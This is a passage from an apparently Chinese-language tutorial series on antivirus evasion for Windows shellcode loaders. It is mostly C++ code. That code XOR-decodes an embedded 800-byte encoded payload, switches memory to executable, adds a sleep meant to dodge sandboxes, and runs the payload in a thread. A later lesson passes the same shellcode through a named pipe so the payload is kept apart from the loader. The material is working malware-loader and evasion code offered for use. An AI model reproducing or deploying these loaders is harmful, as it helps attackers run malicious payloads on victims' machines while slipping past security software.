shellcode_size,</span><br><span class="line">    MEM_COMMIT,</span><br><span class="line">    PAGE_READWRITE <span class="comment">// 只申请可读可写</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将shellcode复制到可读可写的内存页中</span></span><br><span class="line">CopyMemory(shellcode,buf,shellcode_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待几秒，兴许可以跳过某些沙盒呢？</span></span><br><span class="line">Sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">hThread = CreateThread(</span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">    (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">    &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p><code>InterlockedXorRelease</code>函数可以用于两个值的异或运算，最重要的一点就是，它的操作是原子的，也就是可以达到线程同步。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinBase.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc,TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> shellcode_size = <span class="number">0</span>; <span class="comment">// shellcode长度</span></span><br><span class="line">    DWORD dwThreadId; <span class="comment">// 线程ID</span></span><br><span class="line">    HANDLE hThread; <span class="comment">// 线程句柄</span></span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// 内存页属性</span></span><br><span class="line"><span class="comment">/* length: 800 bytes */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取shellcode大小</span></span><br><span class="line">shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 增加异或代码 */</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;shellcode_size; i++)&#123;</span><br><span class="line">    Sleep(<span class="number">50</span>);</span><br><span class="line">    _InterlockedXor8(buf+i,<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">VirtualAlloc(</span></span><br><span class="line"><span class="comment">    NULL, // 基址</span></span><br><span class="line"><span class="comment">    800,  // 大小</span></span><br><span class="line"><span class="comment">    MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">    PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">    );</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * shellcode = (<span class="keyword">char</span> *)VirtualAlloc(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    shellcode_size,</span><br><span class="line">    MEM_COMMIT,</span><br><span class="line">    PAGE_READWRITE <span class="comment">// 只申请可读可写</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将shellcode复制到可读可写的内存页中</span></span><br><span class="line">CopyMemory(shellcode,buf,shellcode_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">VirtualProtect(shellcode,shellcode_size,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待几秒，兴许可以跳过某些沙盒呢？</span></span><br><span class="line">Sleep(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">hThread = CreateThread(</span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">    (LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">    <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">    &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE); <span class="comment">// 一直等待线程执行结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="第四课"><a href="#第四课" class="headerlink" title="第四课"></a>第四课</h1><h2 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h2><p><strong>分离免杀：将恶意代码放置在程序本身之外的一种加载方式。</strong></p>
<p>前面三课主要围绕着程序本身的加载，后面的课程将围绕网络、数据共享的方式去展开</p>
<h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><p>何为管道：<strong>管道是通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节。</strong></p>
<p>通常与Pipe相关的API都与管道有关，包括Cobaltstrike External C2也是用的管道进行进程通信，<strong>一般管道是一个公开的内核对象，所有进程都可以访问。</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFF_SIZE 1024</span></span><br><span class="line"><span class="keyword">char</span> buf[] = <span class="string">&quot;\xf6\xe2\x83\x0a\x0a\x0a\x6a\x83\xef\x3b\xd8\x6e\x81\x58\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xfa\x58\x5d\x81\x58\x1a\x81\x48\x36\x0b\xda\x81\x4a\x72\x8f\xca\x7e\x40\x0b\xda\x5a\x81\x42\x12\x81\x52\x2a\x0b\xd9\xe9\x36\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\x3b\xca\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfe\x09\x77\xf2\x31\x77\x2e\x7f\xe8\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x52\x55\x50\x81\x18\xe1\x8c\x57\x62\x64\x6f\x7e\x0a\x62\x7d\x63\x64\x63\x5e\x62\x46\x7d\x2c\x0d\xf5\xdf\x3b\xf5\x5d\x5d\x5d\x5d\x5d\x62\x30\x5c\x73\xad\xf5\xdf\xe3\x8e\x0a\x0a\x0a\x51\x3b\xc3\x5b\x5b\x60\x09\x5b\x5b\x62\x9a\x15\x0a\x0a\x59\x5a\x62\x5d\x83\x95\xcc\xf5\xdf\xe1\x7a\x51\x3b\xd8\x58\x62\x0a\x08\x6a\x8e\x58\x58\x58\x59\x58\x5a\x62\xe1\x5f\x24\x31\xf5\xdf\x83\xcc\x89\xc9\x5a\x3b\xf5\x5d\x5d\x60\xf5\x59\x5c\x62\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8e\xc9\x0b\x0a\x0a\x3b\xf5\x8f\xfc\x7e\x0e\x83\xf3\xe1\x03\x62\xa0\xcf\xe8\x57\xf5\xdf\x83\xcb\x62\x4f\x2b\x54\x3b\xf5\xdf\x3b\xf5\x5d\x60\x0d\x5b\x5c\x5a\x62\xbd\x5d\xea\x01\xf5\xdf\xb5\x0a\x25\x0a\x0a\x33\xcd\x7e\xbd\x3b\xf5\xe3\x9b\x0b\x0a\x0a\xe3\xc3\x0b\x0a\x0a\xe2\x81\xf5\xf5\xf5\x25\x39\x7f\x65\x4f\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x0a\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x65\x70\x63\x66\x66\x6b\x25\x3f\x24\x3a\x2a\x22\x69\x65\x67\x7a\x6b\x7e\x63\x68\x66\x6f\x31\x2a\x47\x59\x43\x4f\x2a\x33\x24\x3a\x31\x2a\x5d\x63\x64\x6e\x65\x7d\x79\x2a\x44\x5e\x2a\x3c\x24\x3b\x31\x2a\x5e\x78\x63\x6e\x6f\x64\x7e\x25\x3f\x24\x3a\x31\x2a\x48\x45\x43\x4f\x33\x31\x44\x46\x44\x46\x23\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a&quot;</span>;</span><br><span class="line">PTCHAR ptsPipeName = TEXT(<span class="string">&quot;\.\pipe\BadCodeTest&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">RecvShellcode</span><span class="params">(VOID)</span></span>&#123;</span><br><span class="line">    HANDLE hPipeClient;</span><br><span class="line">    DWORD dwWritten;</span><br><span class="line">    DWORD dwShellcodeSize = <span class="keyword">sizeof</span>(buf);</span><br><span class="line">    <span class="comment">// 等待管道可用</span></span><br><span class="line">    WaitNamedPipe(ptsPipeName,NMPWAIT_WAIT_FOREVER);</span><br><span class="line">    <span class="comment">// 连接管道</span></span><br><span class="line">    hPipeClient = CreateFile(ptsPipeName,GENERIC_WRITE,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_EXISTING ,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hPipeClient == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Can&#x27;t Open Pipe , Error : %d \n&quot;</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WriteFile(hPipeClient,buf,dwShellcodeSize,&amp;dwWritten,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(dwWritten == dwShellcodeSize)&#123;</span><br><span class="line">        CloseHandle(hPipeClient);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Send Success ! Shellcode : %d Bytes\n&quot;</span>,dwShellcodeSize);</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hPipeClient);</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, TCHAR * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    HANDLE hPipe;</span><br><span class="line">    DWORD dwError;</span><br><span class="line">    CHAR szBuffer[BUFF_SIZE];</span><br><span class="line">    DWORD dwLen;</span><br><span class="line">    PCHAR pszShellcode = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwOldProtect; <span class="comment">// 内存页属性</span></span><br><span class="line">    HANDLE hThread;</span><br><span class="line">    DWORD dwThreadId;</span><br><span class="line">    <span class="comment">// 参考：https://docs.microsoft.com/zh-cn/windows/win32/api/winbase/nf-winbase-createnamedpipea</span></span><br><span class="line">    hPipe = CreateNamedPipe(</span><br><span class="line">        ptsPipeName,</span><br><span class="line">        PIPE_ACCESS_INBOUND,</span><br><span class="line">        PIPE_TYPE_BYTE| PIPE_WAIT,</span><br><span class="line">        PIPE_UNLIMITED_INSTANCES,</span><br><span class="line">        BUFF_SIZE,</span><br><span class="line">        BUFF_SIZE,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(hPipe == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        dwError = GetLastError();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]Create Pipe Error : %d \n&quot;</span>,dwError);</span><br><span class="line">        <span class="keyword">return</span> dwError;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CreateThread(<span class="literal">NULL</span>,<span class="literal">NULL</span>,(LPTHREAD_START_ROUTINE)RecvShellcode,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ConnectNamedPipe(hPipe,<span class="literal">NULL</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Client Connected...\n&quot;</span>);</span><br><span class="line">        ReadFile(hPipe,szBuffer,BUFF_SIZE,&amp;dwLen,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+]Get DATA Length : %d \n&quot;</span>,dwLen);</span><br><span class="line">        <span class="comment">// 申请内存页</span></span><br><span class="line">        pszShellcode = (PCHAR)VirtualAlloc(<span class="literal">NULL</span>,dwLen,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">        <span class="comment">// 拷贝内存</span></span><br><span class="line">        CopyMemory(pszShellcode,szBuffer,dwLen);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(DWORD i = <span class="number">0</span>;i&lt; dwLen; i++)&#123;</span><br><span class="line">            Sleep(<span class="number">50</span>);</span><br><span class="line">            _InterlockedXor8(pszShellcode+i,<span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里开始更改它的属性为可执行</span></span><br><span class="line">        VirtualProtect(pszShellcode,dwLen,PAGE_EXECUTE,&amp;dwOldProtect);</span><br><span class="line">        <span class="comment">// 执行Shellcode</span></span><br><span class="line">        hThread = CreateThread(</span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">            (LPTHREAD_START_ROUTINE)pszShellcode, <span class="comment">// 函数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line">            <span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">            &amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        WaitForSingleObject(hThread,INFINITE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过一个线程函数充当一个管道客户端，使用管道客户端连接管道，发送Shellcode，然后由管道服务端接收，并反混淆，运行木马线程。</p>
<h1 id="第五课"><a href="#第五课" class="headerlink" title="第五课"></a>第五课</h1><h2 id="真正意义的分离"><a href="#真正意义的分离" class="headerlink" title="真正意义的分离"></a>真正意义的分离</h2><p>将上一课的代码分离开编译，然后通过管道传输，让进程通信。</p>
<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/61c9d3f728cda70fab2d1905d018df9f.png"></p>
<p><strong>BadCodeWithPipe</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span 